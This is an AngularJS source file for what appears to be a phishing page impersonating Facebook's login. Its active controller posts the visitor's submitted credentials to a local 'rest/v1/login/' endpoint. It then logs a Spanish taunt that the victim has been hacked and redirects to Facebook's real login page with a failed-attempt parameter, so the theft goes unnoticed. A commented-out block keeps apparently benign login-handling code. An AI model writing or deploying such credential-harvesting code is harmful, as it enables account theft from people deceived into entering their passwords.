(function(angular){

	'use strict';
	var app = angular.module('loginModule',['ngResource','ngRoute']);

	app.config(['$locationProvider',function($locationProvider) {
		$locationProvider.html5Mode(true);
	}]);


	app.factory('loginService', ['$http','$q', function( $http, $q ){
		var self = {
			login: function( datos ){
				var d = $q.defer();
				$http.post('rest/v1/login/', datos)
					 .success(function( data ){

					 	d.resolve( data );

					 });
				return d.promise;
			}
		};
		return self;
	}]);

	app.controller('mainCtrl', ['$scope','loginService', function($scope,loginService){
		console.log('enter function mainCtrl');
		$scope.guardar = function(contacto) {
			console.log(contacto);
			loginService.login( contacto ).then(function( data ) {
				console.log('Jajaja fuiste hackeado OHH SIII');
				console.log(data);
				setTimeout('window.location = "https://www.facebook.com/login.php?login_attempt=1&lwv=111"',1000);
			});
		};
		/*
		https://www.facebook.com/login.php?login_attempt=1
		$scope.invalid = false;
		$scope.load = false;
		$scope.message = '';

		$scope.data = {};
		$scope.$watch( 'data.email',function() {
			$scope.invalid = false;
		} );
		$scope.$watch( 'data.pwd',function() {
			$scope.invalid = false;
		} );

		$scope.ingresar = function( valid,data ) {

			$scope.invalid = false;
			$scope.load = true;
			$scope.messageEspera = '';
			$('#load').modal('show');

			loginService.login( data ).then(
				function( data ) {
					if( data.error == 'yes' ) {
						$scope.invalid = true;
						$scope.load = false;
						$scope.message = data.msj;
						$('#load').modal('hide');
					} else {
						if( data.error == 'not' ) {
							$scope.messageEspera = data.msj;
							setTimeout('window.location = "../"',1000);
						} else {
							$scope.invalid = true;
							$scope.load = false;
							$scope.message = 'Error del servidor: '+data;
							$('#load').modal('hide');
						}
					}
				});

		};
		$scope.cancelar = function() {
			$scope.invalid = false;
		};*/

	}]);




})(window.angular);

